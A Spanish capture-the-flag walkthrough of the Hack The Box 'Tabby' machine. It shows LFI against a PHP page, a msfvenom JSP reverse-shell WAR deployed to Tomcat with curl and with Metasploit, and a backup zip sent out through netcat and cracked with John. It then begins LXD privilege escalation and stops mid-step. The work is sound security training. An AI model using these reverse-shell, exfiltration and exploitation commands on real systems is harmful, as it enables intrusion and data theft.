---
title: "Tabby - Hack The Box"
date: 2023-05-12
draft: false
slug: "htb-writeup-tabby"
excerpt: "Esta fue una máquina algo complicada, descubrimos que usa el servicio Tomcat para su página web y aplicamos Local File Inclusion (LFI) para poder enumerar distintos archivos como el /etc/passwd y logramos ver el tomcat-users.xml que tiene usuario y contraseña de un usuario de ese servicio. Utilizamos curl para subir una aplicación web tipo .WAR que contiene una Reverse Shell, dentro de la máquina copiamos en base64 un archivo .ZIP con el cual obtenemos la contraseña de un usuario. Por último, usamos el grupo LXD al que esta asignado un usuario para escalar privilegios usando un Exploit."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Tomcat", "Local File Inclusion (LFI)", "Abusing Virtual Host Manager", "Abusing Tomcat Text-Based Manager", "Deploying Authenticated Code Execution Malicious WAR", "Reverse Shell", "Cracking ZIP", "Privesc - LXD/LXC Exploitation", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "curl"
  - "msfvenom"
  - "nc"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/http/tomcat_mgr_deploy"
  - "base64"
  - "sponge"
  - "unzip"
  - "md5sum"
  - "zip2john"
  - "jonhtheripper"
  - "cat"
  - "id"
  - "searchsploit"
  - "wget"
  - "bash"
  - "mv"
  - "export"
links:
  - "https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat"
  - "https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html"
  - "https://www.ibm.com/docs/es/rsas/7.5.0?topic=projects-web-archive-war-files"
  - "https://tomcat.apache.org/security-9.html"
  - "https://es.wikipedia.org/wiki/Alpine_Linux"
  - "https://codingfactsblog.wordpress.com/2020/10/12/escalada-local-de-privilegios-mediante-lxd/"
  - "https://book.hacktricks.xyz/v/es/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-tabby/tabby_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.194                                              
PING 10.10.10.194 (10.10.10.194) 56(84) bytes of data.
64 bytes from 10.10.10.194: icmp_seq=1 ttl=63 time=141 ms
64 bytes from 10.10.10.194: icmp_seq=2 ttl=63 time=139 ms
64 bytes from 10.10.10.194: icmp_seq=3 ttl=63 time=146 ms
64 bytes from 10.10.10.194: icmp_seq=4 ttl=63 time=139 ms

--- 10.10.10.194 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 139.338/141.508/146.437/2.915 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.194 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 13:06 CST
Initiating SYN Stealth Scan at 13:06
Scanning 10.10.10.194 [65535 ports]
Discovered open port 22/tcp on 10.10.10.194
Discovered open port 80/tcp on 10.10.10.194
Discovered open port 8080/tcp on 10.10.10.194
Completed SYN Stealth Scan at 13:07, 27.15s elapsed (65535 total ports)
Nmap scan report for 10.10.10.194
Host is up, received user-set (1.2s latency).
Scanned at 2023-05-12 13:06:38 CST for 27s
Not shown: 49399 filtered tcp ports (no-response), 16133 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
           Raw packets sent: 124283 (5.468MB) | Rcvd: 16192 (647.740KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos 3 puertos abiertos, aunque la movida seria por el puerto 80, recordemos que ya habíamos visto un puerto 8080, pues aquí corre el servicio Tomcat, comprobémoslo con el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,80,8080 10.10.10.194 -oN targeted                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 13:14 CST
Nmap scan report for 10.10.10.194
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   3072 453c341435562395d6834e26dec65bd9 (RSA)
|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat

|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Y ahí está, el servicio Tomcat en el puerto 8080, antes de ir a verlo, vamos a analizar primero el puerto 80.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura1.png">
</p>

Veo muchos campos que podemos analizar si sirven o no, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura2.png">
</p>

Veamos que nos dice **whatweb**:
```bash
whatweb http://10.10.10.194
http://10.10.10.194 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[sales@megahosting.com,sales@megahosting.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.194], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Mega Hosting], X-UA-Compatible[IE=edge]
```

No veo algo que nos pueda ayudar, vayamos al **puerto 8080** para ver que encontramos antes de analizar los campos de la página principal, quizá encontremos algo útil:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura3.png">
</p>

Excelente, al parecer es la página por default del **servicio Tomcat**, veo algunas cosas utiles como la versión de **Tomcat** que vendría siendo la **versión 9**, dos links que te llevan al **manager_webapp y host_manager_webapp** (ambos tiene un login) y por último nos dan una pista sobre donde encontrar usuarios registrados siendo en el archivo `/etc/tomcat9/tomcat-users.xml`.

Regresemos a la página principal y veamos qué campos sirven.

Bueno, ninguno sirvió a excepción del campo **News**, pero nos lleva a este resultado:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura4.png">
</p>

Vamos a registrar el dominio en el **/etc/host** para ver si ya se logra ver:
```bash
nano /etc/host
10.10.10.194 megahosting.htb
```

Recarguemos la página, ya debería verse:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura5.png">
</p>

Ya se ve, pero no veo nada que nos pueda ayudar, solo que esta página fue hecha con **PHP** y que está reproduciendo un archivo por el parámetro **file**, quizá la movida sea por ahí.

Veamos que pasa si eliminamos una sola letra del archivo **statement**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura6.png">
</p>

Interesante, no nos muestra nada, pero no marca ningún error, creo que la movida será por aquí, pero vamos a aplicar **Fuzzing** para ver si nos reporta algo.

### Fuzzing {#Fuzz}

Como la página **News** esta hecha con **PHP**, es posible que existan más archivos **PHP**

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.194/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.194/FUZZ.php/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000001:   200        373 L    938 W      14175 Ch    "index"                                                                                                                                                                   
000000005:   200        0 L      0 W        0 Ch        "news"                                                                                                                                                                    
000045226:   403        9 L      28 W       277 Ch      "http://10.10.10.194/.php/"                                                                                                                                               

Total time: 0
Processed Requests: 220546
Filtered Requests: 220543
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.10.194/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 30
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.194/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 312] [--> http://10.10.10.194/files/]
/index.php            (Status: 200) [Size: 14175]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.194/assets/]
/news.php             (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 440989 / 441094 (99.98%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar la busqueda por archivos especificos. |

Tenemos algunos resultados, pero solamente podremos entrar al de **news.php** y eso especificando el parámetro **file=statement**, porque si no lo especificamos saldra una página en blanco. Veamos que 

Veamos como nos podemos aprovechar de este parámetro.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Local File Inclusion {#LFI}

Como vimos anteriormente, está configurado un directorio con el parámetro **file** que es el que está mostrando el archivo **statement**, entonces si este parámetro puede mostrar archivos quizá podamos ver los que contiene la máquina.

Vamos a probarlo tratando de ver el archivo **passwd** del directorio **/etc**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura7.png">
</p>

Muy bien, descubrimos que la página es vulnerable a un **Local File Inclusion**

Vamos a aprovecharnos de esta vulnerabilidad, con **ctrl + u** se ve mejor el resultado:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura8.png">
</p>

Vemos un usuario llamado **ash**, quizá nos sirva después porque si tratas de listar su directorio no verás nada. Lo que podemos hacer es tratar de ver el archivo **tomcat-users.xml** (que fue la pista que encontramos al entrar al **puerto 8080**) que contendrá el usuario y contraseña del servicio **Tomcat**. 

Usemos la ruta de ese archivo:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura9.png">
</p>

No se ve nada, a lo mejor lo muestra solo en la vista del código fuente:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura10.png">
</p>

Tampoco, entonces me da a entender que se movió este archivo hacia otro lado. 

Busquemos por internet posibles rutas para este archivo.

Encontré algunas rutas que podemos probar:
* <a href="https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory" target="_blank">What is the Tomcat installation directory?</a>

Podemos probar varias, pero la que nos servirá será la siguiente: **/usr/share/tomcat9/etc/tomcat-users.xml**:

Probemos:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura11.png">
</p>

Como puedes observar, no se ve nada, pero sí vemos el código fuente:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura12.png">
</p>

Ya tenemos un usuario y contraseña del servicio **Tomcat**, observa que también nos dan el role del usuario, recuerdalo porque nos servira en unos instantes.

Si recordamos, al entrar en el **puerto 8080** nos dan 2 páginas a las que podemos entrar y nos da un login (**manager_webapp y host_manager_webapp**), pues también se menciona que dependiendo del rol del usuario, tendra acceso a cualquiera de las 2 páginas.

El usuario **tomcat** que encontramos en el **LFI** tiene los roles **"admin-gui,manager-script"**, por lo que unicamente tendra acceso a la página **host_manager_webapp**.

Vamos a probarlo:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura14.png">
</p>

Aca te dejo un blog sobre **tomcat 9**:
* <a href="https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html" target="_blank">Apache Tomcat 9</a>

Veamos el siguiente blog de **HackTricks**:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat" target="_blank">HackTricks: Tomcat</a>

Ve que nos dice que existe otro login siendo el **manager_webapp** (que es el mismo que encontramos en la **máquina Jerry**) y justamente es el mismo que nos indica el **puerto 8080** que no podremos entrar a menos que tengamos el rol **"manager-gui"**.

Intentemos entrar y veamos que encontramos al fallar el login:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura13.png">
</p>

Si existe, pero si no nos autenticamos nos saldrá la página de la imagen, aca igual nos da una pista de un usuario y contraseña, pero te adelanto que no sirven.

Regresemos al login de **host_manager_webapp**.

Ya estamos autenticados, pero el problema es que no hay una opción para subir un archivo como en la **máquina Jerry** lo que nos permitia subir una **Reverse Shell** y con eso ganabamos acceso remoto.

Lo que nos dice **HackTricks** es que podemos incluir un archivo **.WAR** (que es una **Reverse Shell** que hacemos con **Msfvenom**) con la herramienta **curl**, esto se puede lograr unicamente si tienes el rol **admin, manager y manager-script**. 

En nuestro caso, tenemos el rol **admin y manager-script** por lo que podemos intentar aplicar esta intrusión.

### Instalando Aplicación Web .WAR con CURL y Ganando Acceso {#WAR}

¿Qué es un archivo **.WAR**?

| **Archivo .WAR** |
|:-----------:|
| *Una aplicación Web es un grupo de páginas HTML, páginas JSP, servlets, recursos y archivo fuente, que se puede gestionar como una unidad. Un archivo WAR (Web Archive) es una aplicación Web empaquetada. Los archivos WAR se pueden utilizar para importar una aplicación Web a un servidor Web. Además de los recursos del proyecto, el archivo WAR incluye un archivo de descriptor de despliegue Web. El descriptor de despliegue Web es un archivo XML que contiene información de despliegue, tipos MIME, detalles de configuración de sesión y otros valores de una aplicación Web.* |

Entonces, lo que vamos a desplegar es una aplicación maliciosa que nos conecte de manera remota al servidor web, osea que vamos a cargar una **Reverse Shell**.

Lo principal que vamos a hacer es, con **curl** podemos listar aplicaciones web, en este caso en **Tomcat**, añadiendo una ruta (**manager/text/list**) y el usuario y contraseña:
```bash
curl -s -X GET "http://10.10.10.194:8080/manager/text/list" -u 'tomcat:$3cureP4s5w0rd123!'
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
De esta forma podemos saber cuando metamos la **Reverse Shell**.

Ahora, crearemos el Payload con **Msfvenom**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f war -o revshell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: revshell.war
```

Y cargamos el **.WAR** al servicio **Tomcat** con **curl**:
```bash
curl -s --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/reverse"
OK - Deployed application at context path [/reverse]
```

Si listamos otra vez las aplicaciones web, debería aparecer la que acabamos de subir:
```bash
curl -s -X GET "http://10.10.10.194:8080/manager/text/list" -u 'tomcat:$3cureP4s5w0rd123!'                                    
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/reverse:running:0:reverse
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

Genial, solo levanta una **netcat** y entra en esa página web:
```bash
nc -nvlp 443   
listening on [any] 443 ...
```

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura15.png">
</p>

Observa la **netcat**, ya deberías estar conectado:
```bash
nc -nvlp 443   
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.194] 43382
whoami
tomcat
```

Obtén una shell interactiva y continuemos.

### Instalando Aplicación Web .WAR con Metasploit {#Metas}

Dentro de **Metasploit** existen 2 módulos que permiten subir el **archivo .WAR** malicioso a una ruta especifica y con esto, obtenemos usa sesión de **Meterpreter**.

En este caso, estaremos usando el siguiente modulo: `exploit/multi/http/tomcat_mgr_deploy`

Vamos a configurarlo por pasos:

* Inicia el **Metasploit Framework** y usa el módulo indicado:
```bash
msfconsole
*
use exploit/multi/http/tomcat_mgr_deploy
```

* Indica la IP de la máquina víctima y el **puerto 8080**:
```bash
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 10.10.10.194
RHOSTS => 10.10.10.194
msf6 exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8080
RPORT => 8080
```

* Agrega las credenciales de acceso:
```bash
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword $3cureP4s5w0rd123!
HttpPassword => $3cureP4s5w0rd123!
```

* Especifica la ruta a donde va subir el archivo **.WAR**, este módulo añade la ruta **/deploy** por defecto:
```bash
msf6 exploit(multi/http/tomcat_mgr_deploy) > set PATH /manager/text
PATH => /manager/text
```

* Especifica el objetivo (target), que en este caso es una máquina linux y cambia el payload:
```bash
msf6 exploit(multi/http/tomcat_mgr_deploy) > set TARGET 3
TARGET => 3
msf6 exploit(multi/http/tomcat_mgr_deploy) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
PAYLOAD => linux/x86/meterpreter/reverse_tcp
```

* Revisa que tu IP sea correcta, si no cambiala a la correcta.

* Ejecuta el exploit:
```bash
msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit
*
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Using manually select target "Linux x86"
[*] Uploading 1593 bytes as MNkjBGJ.war ...
[*] Executing /MNkjBGJ/PFBzHUDvQt.jsp...
[*] Undeploying MNkjBGJ ...
[*] Sending stage (1017704 bytes) to 10.10.10.194
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.194:44774)
*
meterpreter > getuid
Server username: tomcat
meterpreter > sysinfo
Computer     : 10.10.10.194
OS           : Ubuntu 20.04 (Linux 5.4.0-31-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```
Y listo, ya ganamos acceso con este módulo.

La página de **HackTricks** nos menciona el módulo `exploit/multi/http/tomcat_mgr_upload`, pero este no servira ya que usa la ruta **/html/upload** por defecto, lo que no permitira que se suba correctamente el archivo **.WAR**.

### Enumerando Máquina como Usuario Tomcat {#Tomcat}

Lo que debemos hacer, es tratar de ser otro usuario, ya que como **Tomcat** no podremos hacer nada. 
```bash
tomcat@tabby:/var/lib/tomcat9$ cd /home
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ cd ash
bash: cd: ash: Permission denied
```

Si recordamos el **Fuzzing**, se encontro un directorio llamado **files**, vamos a buscarlo en el directorio **html**.
```bash
tomcat@tabby:/home$ cd /var/www/html/
tomcat@tabby:/var/www/html$ ls -la
total 48
drwxr-xr-x 4 root root  4096 Aug 19  2021 .
drwxr-xr-x 3 root root  4096 Aug 19  2021 ..
drwxr-xr-x 6 root root  4096 Aug 19  2021 assets
-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico
drwxr-xr-x 4 ash  ash   4096 Aug 19  2021 files
-rw-r--r-- 1 root root 14175 Jun 17  2020 index.php
-rw-r--r-- 1 root root  2894 May 21  2020 logo.png
-rw-r--r-- 1 root root   123 Jun 16  2020 news.php
-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt
```

Si entramos en el directorio **files** encontraremos un archivo **.zip**, que sería un Backup:
```bash
tomcat@tabby:/var/www/html$ cd files/
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$ file 16162020_backup.zip 
16162020_backup.zip: Zip archive data, at least v1.0 to extract
```
Existe una forma de obtener este archivo **.zip**, está un poco complicado, pero está interesante el método.

#### Forma 1: Obteniendo Archivo .ZIP Usando Sponge {#ZIP}

Para obtener este archivo en nuestra máquina, vamos a transformarlo en **base64**:
```bash
tomcat@tabby:/var/www/html/files$ base64 16162020_backup.zip 
UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAAUABwAdmFyL3d3dy9odG1sL2Fzc2V0cy9VVAkAAxpv
/FYkaMZedXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIALV9LUjibSsoUgEAAP4CAAAYABwAdmFyL3d3
dy9odG1sL2Zhdmljb24uaWNvVVQJAAMmcZZWQpvoXnV4CwABBAAAAAAEAAAAAN2Ez/9MJuhVkZcI
...
...
...
...
```

Copiamos la data y creamos un archivo en nuestra máquina, ahí pegaremos la data copiada y lo guardaremos:
```bash
nano Backup
Pegar y guardar
```

Ahora debemos convertirlo en un archivo **.zip**, para esto, ocupamos la kit de herramientas **Moreutils** de la cual utilizaremos **Sponge**, puedes descargarla desde tu terminal:
```bash
sponge                              
No se ha encontrado la orden «sponge», pero se puede instalar con:
apt install moreutils
¿Quiere instalarlo? (N/y)y
apt install moreutils
...
```

Y ya podremos convertir la data en el archivo **.zip**, cámbiale el nombre al archivo también:
```bash
base64 -d Backup | sponge data

ls
Backup  data

file data               
data: Zip archive data, at least v1.0 to extract, compression method=store

mv data BackUp.zip
```

Por último, abre el archivo con la herramienta **unzip**:
```bash
unzip BackUp.zip         
Archive:  BackUp.zip
   creating: var/www/html/assets/
[BackUp.zip] var/www/html/favicon.ico password: 
password incorrect--reenter:
```
Bien, nos esta pidiendo una contraseña, es momento de utilizar a **John**.

#### Forma 2: Obteniendo Archivo .ZIP con netcat {#ZIP2}

Podemos leer el contenido del archivo **.zip** (o de cualquier otro archivo) y enviar ese contenido que se esta leyendo a traves de una **netcat** hacia nuestra máquina.

Vamos a intentarlo por pasos:

* Levanta una **netcat** indicando que lo que le llegue lo guarde en un archivo tipo **.zip**, puedes ocupar el mismo nombre que tiene el archivo **.zip** de la máquina víctima.
```bash
nc -nvlp 4433 > backup.zip
listening on [any] 443 ...
```

* Lee el archivo **.zip** y con un **pipe** agrega la conexión hacia nuestra **netcat**:
```bash
tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc Tu_IP 4433
cat 16162020_backup.zip | nc Tu_IP 4433
```

* Una vez que veas que se conecto nuestra **netcat**, corta la conexión y revisa que el archivo se encuentra ahí:
```bash
nc -nvlp 4433 > backup.zip
listening on [any] 4433 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.194] 42616
^C
```

* Para comprobar que fue correcta la obtención del archivo **.zip**, en ambas máquinas checa el **hash md5** del archivo, debe ser el mismo:
```bash
tomcat@tabby:/var/www/html/files$ md5sum 16162020_backup.zip
md5sum 16162020_backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  16162020_backup.zip
---
---
md5sum backup.zip
f0a0af346ad4495cfdb01bd5173b0a52  backup.zip
```
Y listo, esta fue otra forma de obtener este archivo.

### Obteniendo Contraseña de .ZIP con John y Convirtiendonos en Ash {#John}

Para obtener la contraseña, simplemente vamos a usar una de las herramientas de **John** llamada **zip2john**. Lo que hará, será obtener un hash del **.ZIP**, con esto usaremos **John** para descifrar el hash y nos dé una contraseña:
```bash
zip2john BackUp.zip > hash                
ver 1.0 BackUp.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 BackUp.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
...
...
```

Crackea el hash con **John**:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 38.97% (ETA: 16:13:22) 0g/s 5607Kp/s 5607Kc/s 5607KC/s matyang..matwells
admin@it         (BackUp.zip)     
1g 0:00:00:01 DONE (2023-05-12 16:13) 0.5405g/s 5598Kp/s 5598Kc/s 5598KC/s adminf86..admin98
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Ya tenemos la contraseña, te diría que la usaras para que vieras el **.zip**, pero esa cosa no tiene nada importante.

Resulta que la contraseña es la misma para convertirnos en el usuario **Ash**, úsala y obtén la flag:
```bash
tomcat@tabby:/var/www/html/files$ su ash
Password: 
ash@tabby:/var/www/html/files$ whoami
ash
ash@tabby:/var/www/html/files$ cd /home
ash@tabby:/home$ cd ash
ash@tabby:~$ ls -la
total 28
drwxr-x--- 3 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 3 root root 4096 Aug 19  2021 ..
lrwxrwxrwx 1 root root    9 May 21  2020 .bash_history -> /dev/null
-rw-r----- 1 ash  ash   220 Feb 25  2020 .bash_logout
-rw-r----- 1 ash  ash  3771 Feb 25  2020 .bashrc
drwx------ 2 ash  ash  4096 Aug 19  2021 .cache
-rw-r----- 1 ash  ash   807 Feb 25  2020 .profile
-r-------- 1 ash  ash    33 May 12 19:03 user.txt
ash@tabby:~$ cat user.txt
```
¡Excelente!, escalemos privilegios y acabemos con esto.

## Post Explotación {#Post}

### Enumerando Usuario Ash y Usando Exploit para Privesc del Grupo lxd {#LXD}

Si revisamos los grupos en los que se encuentra el usuario **ash**, veremos el siguiente:
```bash
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Nos vamos a aprovechar del grupo **lxd**, busquemos un Exploit y configurémoslo.

Pero antes, ¿qué es el grupo lxd?

| **Grupo lxd** |
|:-----------:|
| *Linux Container Daemon (LXD), es una herramienta de gestión de los contenedores del sistema operativo Linux. Permite crear contenedores de sistemas Linux ideales para su uso en la nube. Con esta herramienta tenemos la posibilidad de crear múltiples contenedores dentro del mismo.* |

Busquemos un Exploit:
```bash
searchsploit lxd                    
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path

|---|---|
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                             | linux/local/46978.sh

|---|---|
Shellcodes: No Results
Papers: No Results
```

Tenemos uno, vamos a copiarlo primero:
```bash
searchsploit -m linux/local/46978.sh
  Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
    Codes: N/A
 Verified: False
File Type: Bourne-Again shell script, Unicode text, UTF-8 text executable
```
Y vamos a analizarlo.

Por lo que entiendo, el Exploit va a crear un contenedor en el que se va a montar el sistema de archivos del usuario root dentro de la máquina víctima, en el que podremos navegar entrando al directorio **/mnt/root** convirtiendonos en root dentro del contenedor.

Para que funcione este Exploit, debemos descargar y ejecutar un archivo llamado **build-alpine** y luego, subir tanto el Exploit como el archivo generado del **build-alpine** hacia la máquina víctima. 

¿Qué es **Alpine**?

| **Alpine Linux** |
|:-----------:|
| *Alpine Linux es una distribución Linux basada en musl y BusyBox, que tiene como objetivo ser ligera y segura por defecto sin dejar de ser útil para tareas de propósito general. A pesar de estar diseñada para ejecutarse en memoria RAM también es recomendable y perfectamente funcional en ordenadores personales y servidores. En su página web oficial se encuentran diferentes manuales (howto) para realizar la instalación (live en RAM, sys en disco, etc).* |

Hagámoslo por pasos:

* Descarga el archivo **build-alpine**:
```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2023-05-12 16:59:45--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com) ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8060 (7.9K) [text/plain]
Grabando a: «build-alpine»
build-alpine                      100%[==============================================>]   7.87K  --.-KB/s    en 0s      
2023-05-12 16:59:45 (15.8 MB/s) - «build-alpine» guardado [8060/8060]
```

* Ejecuta el archivo **build-alpine**:
```bash
bash build-alpine             
Determining the latest release... v3.18
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64
